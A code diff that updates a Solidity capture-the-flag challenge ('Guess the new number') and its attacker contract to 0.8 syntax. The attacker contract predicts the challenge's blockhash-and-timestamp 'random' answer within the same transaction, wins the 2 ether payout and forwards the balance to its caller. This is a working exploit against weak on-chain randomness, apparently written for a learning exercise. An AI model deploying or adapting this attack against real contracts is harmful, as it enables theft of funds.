@@ -1,7 +1,7 @@
-pragma solidity ^0.4.21;
+pragma solidity ^0.8.0;
 
 contract GuessTheNewNumberChallenge {
-    function GuessTheNewNumberChallenge() public payable {
+    constructor() payable {
         require(msg.value == 1 ether);
     }
 
@@ -11,25 +11,30 @@ contract GuessTheNewNumberChallenge {
 
     function guess(uint8 n) public payable {
         require(msg.value == 1 ether);
-        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
 
         if (n == answer) {
-            msg.sender.transfer(2 ether);
+            payable(msg.sender).transfer(2 ether);
         }
     }
 }
 
 contract GuessTheNewNumberAttacker {
-    address victim;
+    GuessTheNewNumberChallenge victim;
 
-    function GuessTheNewNumberAttacker(address _victim) {
-        victim = _victim;
+    constructor(address _victim) {
+        victim = GuessTheNewNumberChallenge(_victim);
     }
 
-    function attack() payable {
+    function attackContract() public payable {
         require(msg.value == 1 ether);
-        uint256 myAnswer = uint8(keccak256(block.blockhash(block.number - 1), now));
-        GuessTheNewNumberChallenge(victim).guess{value: 1 ether}(myAnswer);
+        uint8 myAnswer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
+        
+        victim.guess{value: 1 ether}(myAnswer);
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {
 
     }
 }
